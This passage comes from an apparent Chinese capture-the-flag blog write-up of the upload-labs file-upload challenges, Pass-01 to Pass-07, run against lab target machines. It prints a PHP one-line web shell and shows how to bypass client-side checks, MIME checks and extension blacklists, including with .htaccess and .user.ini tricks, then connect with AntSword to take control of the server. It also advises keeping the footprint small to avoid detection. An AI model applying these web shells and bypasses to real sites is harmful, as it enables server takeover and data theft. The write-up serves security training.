class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，文件类型的限定语句为 <code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code> 那么只要将我们要上传的文件的后缀名加入，并在控制台中执行即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b01b256d8.webp" alt="" style="zoom: 75%;" /></li><li><p>禁用 JavaScript ：右键——检查——设置——禁用即可</p><img src="https://bu.dusays.com/2022/05/09/6278b02bc19fe.webp" alt="" style="zoom: 75%;" /></li><li><p>删除 HTML 中代码即删除如图语句即可</p><img src="https://bu.dusays.com/2022/05/09/6278b018e3961.webp" alt="" style="zoom: 75%;" /></li></ul></li><li><p>解除限制之后，便可以将文件上传了</p><img src="https://bu.dusays.com/2022/05/09/6278b01c13623.webp" alt="" style="zoom: 75%;" /></li><li><p>刚开始对页面研究时我们得知，文件是直接上传至网页所在目录的 <kbd>upload</kbd> 目录下的，因此可以得知我们上传的文件的 URL 为 <code>http://靶机地址/upload/木马.php</code> ，当然也可以在上传页直接查看文件地址。值得注意的是，URL 中不应包含中文字符，这里取的这个名字显然是不能直接这么用了，改名是不可能改名的，因此这里需要编码一下 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。</p></li></ul><h3 id="入侵-2">入侵</h3><ul><li><p>上传好木马后，就该使用工具进入整个后台服务器了。中国蚁剑既可以完成这个任务，配置安装入门可参考官方 <a href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md">中文文档</a> 。打开软件添加连接：</p><img src="https://bu.dusays.com/2022/05/09/6278b01f31e6a.webp" alt="" style="zoom: 75%;" /></li><li><p>注意到，这里需要输入密码，那么密码是什么呢？在前面输入的一句话代码中， <code>&lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> ，我们将通过 post 方法将内容传输至 <kbd>h-t-m</kbd> 变量中而实现入侵，而这个变量就是进入服务器所需要的连接密码。因此，输入变量名即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b0219b431.webp" alt="" style="zoom: 75%;" /></li><li><p>添加成功后双击连接即可进入木马文件所在目录，右边同样可以看到目录列表，因此现在我们已经拥有了网站所有的文件了，并且可以进行任意增删改查！</p><img src="https://bu.dusays.com/2022/05/09/6278b0227f79a.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="寻找-flag-2">寻找 flag</h3><ul><li><p>既然已经获得所有权了，那就可以慢慢找了。不过，目前的经验表明，flag 一般会放在根目录，因此首先查看根目录，果不其然：</p><img src="https://bu.dusays.com/2022/05/09/6278b0280afb4.webp" alt="" style="zoom: 75%;" /></li><li><p>都到这一步了，就双击打开吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b02924fa4.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-02">Pass-02</h2><h3 id="启动靶机-12">启动靶机</h3><ul><li><p>第二关的界面没有任何变化。</p><img src="https://bu.dusays.com/2022/05/09/6278b00fcb452.webp" alt="" style="zoom: 75%;"/></li></ul><h3 id="研究页面-5">研究页面</h3><ul><li><p>上传一个图片文件，可以正常上传，且依然上传在了网站目录的 <kbd>upload</kbd> 目录下。</p><img src="https://bu.dusays.com/2022/05/09/6278b01097a5d.webp" alt="" style="zoom: 75%;"/><img src="https://bu.dusays.com/2022/05/09/6278b019b7879.webp" alt="" style="zoom: 75%;"/></li><li><p>再上传一个其他文件，无法正常上传，且提示错误信息与上次不同。</p><img src="https://bu.dusays.com/2022/05/09/6278b01d2c157.webp" alt="" style="zoom: 75%;" /></li><li><p>小白表示线索不够，依然选择看提示，提示显示：<code>本pass在服务端对数据包的 MIME 进行检查！X2</code> 。虽然不知道为啥要显示两遍，但显然这很重要！</p><img src="https://bu.dusays.com/2022/05/09/6278b01e4a703.webp" alt="" style="zoom: 75%;"/><blockquote><p><strong>注</strong>：由于在提示加载出来之前我快速点击了两遍，因此才会显示两遍。</p></blockquote></li><li><p>所以，什么是 <kbd>MIME</kbd>？</p><blockquote><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><div align="right" >——百度百科</div></blockquote><p>显然这个解释帮助不是很大，但是我们有必要知道的就是，<code>MIME</code> 信息头中有以下几个重要字段：</p><ol><li><kbd>MIME-Version</kbd>: 提供所用的 <kbd>MIME</kbd> 版本号。</li><li><kbd>Content-Type</kbd>: 表示数据类型。</li><li><kbd>Content-Transfer-Encoding</kbd>: 表示对数据执行的编码方式。</li></ol><p>如果要对数据包的 <kbd>MIME</kbd> 进行检查，那么显然当我们上传木马文件的时候就没办法通过服务器对 <kbd>Content-Type</kbd> 的限制了。</p></li><li><p>既然如此，我们就可以查看一下源码：</p><img src="https://bu.dusays.com/2022/05/09/6278b020845f5.webp" alt="" style="zoom: 75%;" /><p>里面最关键的就是 <kbd>if</kbd> 判断语句中的内容，他决定我们能否上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不难看出，该判断语句将 <kbd>MIME</kbd> 信息头的 <kbd>Content-Type</kbd> 字段限制在了 <kbd>image/jpeg</kbd> 、 <kbd>image/png</kbd> 、 <kbd>image/gif</kbd> 三种类型中。</p></li><li><p>由于判断发生在服务端，因此继续修改前端代码就有点自欺欺人了。为了让我们的木马文件继续符合条件，我们有必要抓包了！</p></li></ul><h3 id="突破限制-3">突破限制</h3><ul><li><p>首先依然先准备好一句话木马文件，与第一关一样。</p></li><li><p>打开 <kbd>BurpSuite</kbd> 并在内部浏览器打开网页，准备抓包：</p><img src="https://bu.dusays.com/2022/05/09/6278b0240c050.webp" alt="" style="zoom: 75%;" /></li><li><p>将我们的木马文件上传，可以看到抓包的内容，其中就有我们所关注的 <kbd>Content-Type</kbd> 字段：</p><img src="https://bu.dusays.com/2022/05/09/6278b0263fc57.webp" alt="" style="zoom: 75%;" /><p>直接修改这个字段，让我们的字段符合条件然后点击 <kbd>Forward</kbd> 即可：</p><img src="https://bu.dusays.com/2022/05/09/6278b02a61c74.webp" alt="" style="zoom: 75%;" /></li><li><p>返回网页即可看到，我们的文件已经成功上传了！</p><img src="https://bu.dusays.com/2022/05/09/6278b02ca8766.webp" alt="" style="zoom: 75%;" /></li><li><p>一开始上传图片的时候我们便知道，文件依然存储于网站目录的 <kbd>upload</kbd> 目录下，因此木马文件所在的 URL 还是：<code>http://靶机地址/upload/木马.php</code> ，当然，编码后为 <code>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</code> 。也可以右键新标签页打开文件，地址栏直接复制地址，后面都推荐使用这种方式！</p></li></ul><h3 id="夺旗">夺旗</h3><ul><li><p>上传成功那剩下就还是老样子了，先在中国蚁剑中添加链接：</p><img src="https://bu.dusays.com/2022/05/09/6278b02d7e507.webp" alt="" style="zoom: 75%;" /></li><li><p>然后进入网站目录列表：</p><img src="https://bu.dusays.com/2022/05/09/6278b02e60195.webp" alt="" style="zoom: 75%; " /></li><li><p>根据前面的经验，直接访问根目录，打开 <code>flag</code> ，夺旗成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b02f3de14.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-03">Pass-03</h2><h3 id="启动靶机-13">启动靶机</h3><ul><li><p>熟悉的界面一点没变</p><img src="https://bu.dusays.com/2022/05/09/6278b030453b4.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面">研究界面</h3><ul><li><p>显然上传目录是不会改变的，因此不再检测图片，直接传木马！</p><img src="https://bu.dusays.com/2022/05/09/6278b0310f62a.webp" alt="" style="zoom: 75%;" /><p>那当然是没这么简单的，果不其然返回了错误信息，但是第三关的错误信息跟第二关就不太一样了。之前是只让传图片，现在是直接给可能的木马文件拉了黑名单。</p></li><li><p>错误信息表明应该只限制了 <kbd>.asp</kbd>、<kbd>.aspx</kbd>、<kbd>.php</kbd>、<kbd>.jsp</kbd> 这四种文件后缀名而已，如果是这样的话，我们只要修改后缀名即可上传成功。查看源代码确认：</p><img src="https://bu.dusays.com/2022/05/09/6278b0328d240.webp" alt="" style="zoom: 75%;" /><p>由这两句可以看出，确实是仅仅限制了这四种后缀名而已。</p></li><li><p>可以注意源代码中有这么一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这意味着不仅这四种后缀名，还包括他们的大小写形式都被屏蔽了，即形如 <kbd>.PhP</kbd> 、<kbd>.pHP</kbd> 、<kbd>.PHP</kbd> 等。</p></li></ul><h3 id="突破限制-4">突破限制</h3><ul><li><p>那么，后缀名如何修改才能不影响木马文件的使用呢？</p><blockquote><p>在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中默认允许将多个扩展作为 <kbd>php</kbd> 脚本执行（兼容性考量）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/etc/apache2/mods-enabled/php5.conf</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><div align="right"><a src="https://github.com/monstra-cms/monstra/issues/429">来自 GitHub </a></div></blockquote><p>从上方的正则表达式中可以看出，在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中后缀名为 <kbd>.php</kbd>、<kbd>.php3</kbd>、<kbd>.php4</kbd>、<kbd>.php5</kbd>、<kbd>.pht</kbd>、<kbd>.phtml</kbd>、<kbd>.phps</kbd> 的文件都会被解析为 <kbd>php</kbd> 文件。</p><p>当然，这只是一个特殊版本的例子，事实上我们并不知道靶机网站是什么版本的。但是我们可以参考这个修改我们的木马文件后缀名为上述其一，大部分情况修改为 <kbd>php3</kbd> 即可。</p></li><li><p>直接修改备好的木马文件：</p><img src="https://bu.dusays.com/2022/05/09/6278b0337dbbe.webp" alt="" style="zoom: 75%;" /></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b034494fc.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-2">夺旗</h3><ul><li><p>蚁剑添加</p><img src="https://bu.dusays.com/2022/05/09/6278b035a0bd6.webp" alt="" style="zoom: 75%;" /><p>不难看出，第三关不再保留我们的文件名了，因此我不需要再对中文进行编码了。</p></li><li><p>既然已经进来了，就不急着夺旗，先看看他到底支持哪些 <kbd>php</kbd> 后缀名。访问下方文件 <code>/var/www/html/docker/docker-php.conf</code></p><img src="https://bu.dusays.com/2022/05/09/6278b0368b390.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/09/6278b037b16a0.webp" alt="" style="zoom: 75%;" /><p>因此，只支持 <kbd>php</kbd>、<kbd>php3</kbd>、<kbd>phtml</kbd> 三种！（当然这仅代表我所使用的靶机仅支持这三种。）</p></li><li><p>满足了好奇心之后，便直接根目录夺旗吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b038b01c1.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-04">Pass-04</h2><h3 id="启动靶机-14">启动靶机</h3><ul><li><p>熟悉的页面：</p><img src="https://bu.dusays.com/2022/05/09/6278b039b8f36.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-2">研究界面</h3><ul><li><p>直接上传木马文件，提示错误：此文件不允许上传！</p><img src="https://bu.dusays.com/2022/05/09/6278b03a9d262.webp" alt="" style="zoom: 75%;" /></li><li><p>小白依然理直气壮看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b03bddbd7.webp" alt="" style="zoom: 75%;" /><p>好家伙一口气把这么多后缀名都给拉黑了，因此第三关的方法就不适用了。</p></li><li><p>查看源码，可以发现和第三关一样，依旧屏蔽了大小写：</p><img src="https://bu.dusays.com/2022/05/09/6278b04438013.webp" alt="" style="zoom: 75%;"/></li><li><p>根据上一关的思路，有没有可能让后缀名为 <kbd>.jpg</kbd> 、 <kbd>.png</kbd> 之类的图片文件或者其他文件也被解析为 <kbd>.php</kbd> 脚本呢？</p><p>可以使用 <kbd>.htaccess</kbd> ，即所谓的分布式配置文件，我们可以通过这个文件传输指令，将伪装成图片的木马文件解析成 <kbd>php</kbd> 脚本。值得注意的是，<kbd>.htaccess</kbd> 的作用域在文件所在目录及其所有子目录，而我们上传的所有文件都会在同一目录，此外该后缀名也不在黑名单中，因此完全可用！</p></li></ul><h3 id="突破限制-5">突破限制</h3><ul><li><p>要使用 <kbd>.htaccess</kbd> 文件实现攻击，首先我们需要了解部分指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件解析为 php 脚本执行</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件用 php处理器 来处理，效果同上</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># 将所有文件解析为 php 脚本执行</span><br></pre></td></tr></table></figure><p>此外，还有部分标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;h-t-m&quot;&gt;</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"># 文件匹配，引号中为正则表达式，匹配成功则执行内部指令</span><br><span class="line"></span><br><span class="line">&lt;IfModule 模块名&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"># 当指定模块开启时，内部指令执行</span><br></pre></td></tr></table></figure></li><li><p>上述两种标签都可以使用，文件匹配就匹配上传的木马文件名即可，而模块检测可以检测 <kbd>mime-module</kbd> 即可，这个模块执行 <kbd>MIME</kbd> 相关内容，在第二关我们知道要打开一个文件就要检测 <kbd>MIME</kbd> 然后匹配对应处理器，而这正适用于这里。推荐使用文件匹配（精确具体文件名）的方式，尽可能对网站的影响减到最小，<psw>避免入侵被发现</psw>。</p><p>使用文件匹配标签时，指令对象只会是我们所指定的对象，因此 <kbd>.htaccess</kbd> 内容可以如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;木马.h-t-m&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>我们将木马文件名修改为 <kbd>木马.h-t-m</kbd>，虽然这不是正确的后缀名，但是显然只要在黑名单之外的均可。</p></li><li><p>准备好两个文件，木马文件直接修改后缀名为 <kbd>.h-t-m</kbd> ，配置文件内输入上述指令且保证文件名为 <kbd>.htaccess</kbd> 即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b03cb30ff.webp" alt="" style="zoom: 75%;" /></li><li><p>上传至靶机，自然是成功了的：</p><img src="https://bu.dusays.com/2022/05/09/6278b03dca9cf.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-3">夺旗</h3><ul><li><p>蚁剑添加，然后成功进入</p><img src="https://bu.dusays.com/2022/05/09/6278b03eacb88.webp" alt="" style="zoom: 75%;" /></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b03fc77d8.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-05">Pass-05</h2><h3 id="启动靶机-15">启动靶机</h3><ul><li><p>更改靶机环境，本关为后补，因此 Pass-6 和 Pass-07 其实是原环境的 Pass-05 和 Pass-06 ，请忽略截图可能带来的题号不匹配。</p><img src="https://bu.dusays.com/2022/05/09/6278b059aff98.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-3">研究界面</h3><ul><li><p>查看提示，看不懂~</p><img src="https://bu.dusays.com/2022/05/09/6278b05a91f47.webp" alt="" style="zoom: 75%;" /></li><li><p>本关一开始我当作第十关解了，虽然确实很像，而且第十关的解法也适用于这几关，但是显然 Pass-05 应该有自己的漏洞。</p></li><li><p>仔细观察黑名单，会发现后面几关的黑名单都比这一关多了一个 <kbd>.ini</kbd>，也就是说，这一关的漏洞应该与第四关类似的上传两个文件越过检查。<psw>可算是明白为啥要把这一关添加到这里了！</psw></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="comment"># 后面关卡的黑名单列表</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-6">突破限制</h3><ul><li><kbd>php.ini</kbd> 是 <kbd>php</kbd> 的配置文件，<kbd>.user.ini</kbd> 中的字段也会被 <kbd>php</kbd> 视为配置文件来处理，从而导致 <kbd>php</kbd> 的文件解析漏洞。因此 <kbd>.ini</kbd> 实际上屏蔽的就是 <kbd>.user.ini</kbd> 文件，与上一关的 <kbd>.htaccess</kbd> 一样作为配置文件，而且 <kbd>.user.ini</kbd> 的用途更广。主要有这两条指令：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m <span class="comment">//在页面顶部加载520.h-t-m文件</span></span><br><span class="line">auto_append_file=<span class="number">520</span>.h-t-m  <span class="comment">//在页面底部加载520.h-t-m文件</span></span><br></pre></td></tr></table></figure><p>其实就是会将文件内容包含进 <kbd>php</kbd> 文件中再运行。而要达到这个目的，还需要三个前提条件：</p><ol><li>服务器脚本语言为 <kbd>PHP</kbd></li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol></li><li><p>现在应该就不难理解提示里的那句：上传目录存在 php 文件（readme.php）。也就是说，环境已经构建好，就等着传文件入侵了！</p></li><li><p>准备文件：创建 <kbd>.user.ini</kbd> 文件，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m</span><br></pre></td></tr></table></figure><p>修改木马文件的文件名为 <kbd>520.h-t-m</kbd>：</p><img src="https://bu.dusays.com/2022/05/11/627bd80672fe9.webp" alt="" style="zoom: 75%;" /></li><li><p>上传二位，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd7f6c0384.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-4">夺旗</h3><ul><li><p>蚁剑连接，这里需要注意的是，<kbd>.uesr.ini</kbd> 的作用是将目标文件嵌入既有 <kbd>php</kbd> 文件中执行，因此我们连接时就得连接到既有的 <kbd>php</kbd> 文件中，这里就是提示中所说的 <kbd>readme.php</kbd> 文件。</p><img src="https://bu.dusays.com/2022/05/11/627bd7f904f2c.webp" alt="" style="zoom: 75%;" /><p>很好，返回数据为空，行动失败！</p></li></ul><h3 id="问题探究">问题探究</h3><ul><li><p>返回数据为空意味着可以连接到文件但是文件无效，也就是一句话木马并没有加入到 <kbd>readme.php</kbd> 文件中。看来得检验一下环境！</p></li><li><p>通过其他关卡上传一句话木马其中包含语句 <kbd>phpinfo();</kbd> 也就是返回当前服务器得 <kbd>php</kbd> 版本等相关信息，可以看到结果如下：</p><img src="https://bu.dusays.com/2022/05/11/627bd7faaf6ec.webp" alt="" style="zoom: 75%;" /><p>可以确定服务器是使用CGI／FastCGI模式，也就是理论上上述的三大前提都符合，木马不应该没有嵌入才对。</p></li><li><p>在 <kbd>php</kbd> 的手册中，有这么一句话</p><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p><div align="right">——<a src="https://php.golaravel.com/configuration.file.per-user.html">php中文手册</a></div></blockquote></li><li><p>也就是说，版本太低了！</p><p>还是老老实实本地搭建靶机，虽然没有夺旗的乐趣，但毕竟自力更生才能走得长远。不过后续的关卡还是优先在 BUU 上完成。</p></li></ul><h3 id="再次突破">再次突破</h3><ul><li><p>本地部署并且上传完成后，蚁剑连接，完美！</p><img src="https://bu.dusays.com/2022/05/11/627bd7fc623d5.webp" alt="" style="zoom: 75%;" /></li><li><p>于是我就成功入侵了自己的电脑，果然还是入侵别人的靶机有意思~</p></li></ul><h2 id="Pass-06">Pass-06</h2><h3 id="启动靶机-16">启动靶机</h3><ul><li><p>再次回到起点，一切还是那么熟悉</p><img src="https://bu.dusays.com/2022/05/09/6278b04115119.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-4">研究界面</h3><ul><li><p>先拿第四关的文件上传一遍，发现 <kbd>木马.h-t-m</kbd> 文件上传成功了，但是 <kbd>.htaccess</kbd> 文件被阻止了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04266c0f.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/09/6278b0434423b.webp" alt="" style="zoom: 75%;" /><p>不难看出，难度升级，配置文件也不能用了。</p></li><li><p>那就再从源码下手，在前面关卡中我们有提到屏蔽大小写，而这一关的代码中，那一句代码却没了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04529987.webp" alt="" style="zoom: 75%;" /><p>这样的话，问题就简单了。</p></li></ul><h3 id="突破限制-7">突破限制</h3><ul><li><p>直接修改后缀名，改成大写的</p><img src="https://bu.dusays.com/2022/05/09/6278b0460a38d.webp" alt="" style="zoom: 75%;" /></li><li><p>上传至靶机，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b046c7f44.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-5">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b04805796.webp" alt="" style="zoom: 75%;" /><p>有趣的是，这一关又是会对上传的文件自动编号的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b0491dd3e.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-07">Pass-07</h2><h3 id="启动靶机-17">启动靶机</h3><ul><li><p>再次回到起点，加油网安人</p><img src="https://bu.dusays.com/2022/05/09/6278b04a31b26.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-5">研究界面</h3><ul><li><p>上传第六关文件测试，果然失败了。</p><img src="https://bu.dusays.com/2022/05/09/6278b04b144d9.webp" alt="" style="zoom: 75%;" /></li><li><p>查看提示，变化不大，但是却没有拉黑 <kbd>.htaccess</kbd> 文件。</p><img src="https://bu.dusays.com/2022/05/09/6278b04c4b51e.webp" alt="" style="zoom: 75%;" /><p>不过可以认为这只是个 bug ，因为在源码中，可以看到 <kbd>.htaccess</kbd> 文件是在黑名单中的：</p><img src="https://bu.dusays.com/2022/05/09/6278b04d2f290.webp" alt="" style="zoom: 75%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span 